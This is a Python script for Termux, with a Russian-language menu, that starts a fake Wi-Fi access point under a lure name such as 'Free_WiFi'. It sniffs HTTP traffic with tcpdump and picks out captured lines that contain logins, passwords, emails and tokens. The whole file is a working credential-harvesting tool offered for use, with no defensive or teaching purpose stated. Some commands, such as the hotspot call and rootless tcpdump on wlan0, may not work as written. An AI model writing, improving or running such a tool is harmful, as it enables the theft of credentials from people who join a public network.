import os
import subprocess
import signal
import time

DATA_FOLDER = 'wifi_data'
OUTPUT_FILE = f'{DATA_FOLDER}/captured_data.txt'

def install_dependencies():
    print("📦 Проверяю и устанавливаю зависимости...")
    os.system('pkg update -y && pkg upgrade -y')
    os.system('pkg install termux-api tcpdump python -y')
    os.system('pip install requests')
    print("✅ Зависимости готовы")

def create_fake_ap(ssid):
    print(f"📡 Запускаю точку доступа: {ssid}")
    os.system(f'termux-wifi-hotspot start --ssid "{ssid}"')
    print(f"✅ Точка '{ssid}' активна")

def stop_fake_ap():
    os.system('termux-wifi-hotspot stop')
    print("🛑 Точка доступа остановлена")

def listen_http_traffic():
    print(f"👂 Слушаю HTTP трафик... (Ctrl+C для остановки)")
    print(f"📁 Данные сохраняются в {OUTPUT_FILE}")
    try:
        os.system(f'tcpdump -i wlan0 -A -l "tcp port 80 or tcp port 8080" >> {OUTPUT_FILE} 2>&1')
    except KeyboardInterrupt:
        print("\n⏹️ Прослушивание остановлено")

def show_captured_data():
    if os.path.exists(OUTPUT_FILE):
        print(f"\n📁 Содержимое {OUTPUT_FILE}:")
        with open(OUTPUT_FILE, 'r', errors='ignore') as file:
            content = file.read()
            if content.strip():
                # Показываем только строки с логинами и паролями
                for line in content.split('\n'):
                    if any(word in line.lower() for word in ['login', 'password', 'user', 'pass', 'email', 'secret', 'token']):
                        print(f"🔑 {line.strip()}")
            else:
                print("📭 Файл пуст")
    else:
        print("❌ Файл с данными не найден")

def show_statistics():
    print("\n📊 Статистика точки доступа:")
    os.system('termux-wifi-hotspot status')

def save_data(data, filename):
    filepath = f"{DATA_FOLDER}/{filename}"
    with open(filepath, 'a') as file:
        file.write(data + '\n')

def main():
    # Установка зависимостей при первом запуске
    if not os.path.exists('/data/data/com.termux/files/usr/bin/tcpdump'):
        install_dependencies()
    
    # Создаём папку для данных
    if not os.path.exists(DATA_FOLDER):
        os.makedirs(DATA_FOLDER)
    
    print("""
╔══════════════════════════════════╗
║  📡 Wi-Fi СКАНЕР (Termux)      ║
║  Без root | Без адаптера       ║
╚══════════════════════════════════╝
""")
    
    ssid = input('📶 Название сети (например Free_WiFi): ').strip()
    if not ssid:
        ssid = "Free_WiFi"
    
    while True:
        print("""
╔══════════════════════════════════╗
║  1. Создать точку доступа       ║
║  2. Слушать HTTP трафик         ║
║  3. Показать захваченные данные ║
║  4. Статистика клиентов         ║
║  5. Остановить точку доступа    ║
║  6. Выход                       ║
╚══════════════════════════════════╝
""")
        
        choice = input('>>> ').strip()
        
        if choice == '1':
            create_fake_ap(ssid)
        elif choice == '2':
            listen_http_traffic()
        elif choice == '3':
            show_captured_data()
        elif choice == '4':
            show_statistics()
        elif choice == '5':
            stop_fake_ap()
        elif choice == '6':
            stop_fake_ap()
            print(f"👋 Выход. Данные сохранены в папку {DATA_FOLDER}/")
            break
        else:
            print('❌ Неверный выбор (1-6)')

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print("\n👋 Выход")
